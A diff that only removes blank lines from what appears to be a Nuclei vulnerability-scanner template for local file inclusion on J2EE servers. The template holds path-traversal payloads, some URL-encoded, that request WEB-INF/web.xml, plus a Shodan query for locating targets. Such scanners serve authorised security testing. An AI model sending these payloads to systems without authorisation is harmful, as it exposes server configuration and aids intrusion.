@@ -1,5 +1,4 @@
 id: generic-j2ee-lfi
-
 info:
   name: Generic J2EE LFI scan
   author: davidfegyver
@@ -11,7 +10,6 @@ info:
     verified: true
     shodan-query: http.title:"J2EE"
   tags: lfi,generic,j2ee
-
 requests:
   - method: GET
     path:
@@ -28,7 +26,6 @@ requests:
       - "{{BaseURL}}/.//WEB-INF/web.xml"
       - "{{BaseURL}}/../WEB-INF/web.xml"
       - "{{BaseURL}}/%c0%ae/WEB-INF/web.xml"
-
     stop-at-first-match: true
     matchers-condition: and
     matchers:
@@ -38,7 +35,6 @@ requests:
           - "<servlet-name>"
           - "</web-app>"
         condition: and
-
       - type: status
         status:
           - 200
